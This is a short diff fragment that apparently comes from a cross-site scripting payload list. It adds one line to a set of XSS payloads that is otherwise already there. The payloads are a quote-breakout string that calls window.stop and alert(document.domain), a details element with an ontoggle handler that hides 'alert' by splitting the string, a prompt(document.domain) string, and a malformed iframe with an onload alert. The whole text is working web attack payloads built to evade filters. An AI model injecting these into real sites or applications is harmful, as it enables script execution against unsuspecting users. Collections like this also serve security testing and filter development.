@@ -1,3 +1,4 @@
+";window.stop();alert(document.domain);// 
 <details open ontoggle​=content['al'%2B'ert'](1) >
  "*prompt(document.domain)*"
  "><<iframe onx=() onload=(alert)(6)>
